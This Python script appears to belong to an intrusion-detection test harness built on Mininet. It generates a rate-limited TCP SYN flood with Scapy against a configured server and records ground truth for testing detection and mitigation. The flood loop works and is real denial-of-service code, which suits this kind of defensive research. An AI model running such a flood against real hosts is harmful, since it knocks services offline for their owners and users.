"""Denial of service (experimental case C3).

A controlled TCP SYN flood from one host at one target. Deliberately kept to a
rate that is unambiguous to a volumetric detector but that will not wedge the
emulated network: the point is to test detection and mitigation, not to find
out how much traffic Mininet can carry.
"""

import sys
import time


from scapy.all import IP, TCP, RandShort  # noqa: E402

from traffic.common import send

from lantern import config  # noqa: E402
from traffic.common import (
    GroundTruth,
    attack_parser,
    resolve_source,
    seeded,
)  # noqa: E402


def run(src_ip, target_ip, target_port, duration, pps, verbose=False):
    """Flood at an approximate packets-per-second rate.

    Scapy's own inter-packet timing is unreliable at high rates, so packets are
    sent in bursts and the loop sleeps to hit the target rate on average. The
    achieved rate is returned so the result can be reported honestly rather
    than assumed.
    """
    deadline = time.time() + duration
    burst = max(int(pps / 10), 1)
    sent = 0
    started = time.time()

    while time.time() < deadline:
        packets = [
            IP(src=src_ip, dst=target_ip)
            / TCP(sport=RandShort(), dport=target_port, flags="S")
            for _ in range(burst)
        ]
        send(packets, verbose=verbose)
        sent += burst
        time.sleep(max(0.1 - (time.time() % 0.1), 0))

    elapsed = time.time() - started
    return sent, sent / elapsed if elapsed else 0.0


def main():
    parser = attack_parser(__doc__)
    parser.add_argument("--target", default=None)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument(
        "--pps",
        type=float,
        default=config.DOS_PPS * 3,
        help="target packets per second",
    )
    args = parser.parse_args()
    seeded(args.seed)

    src_ip = resolve_source(args)
    target_ip = args.target or config.HOST_TO_IP[config.APP_SERVER]

    with GroundTruth(
        "dos",
        args.case,
        args.trial,
        src_ip,
        targets=[target_ip],
        note="TCP SYN flood at ~%.0f pps" % args.pps,
    ):
        sent, achieved = run(src_ip, target_ip, args.port, args.duration, args.pps)

    print(
        "dos: %s -> %s:%d, %d packets, %.0f pps achieved"
        % (src_ip, target_ip, args.port, sent, achieved)
    )


if __name__ == "__main__":
    main()
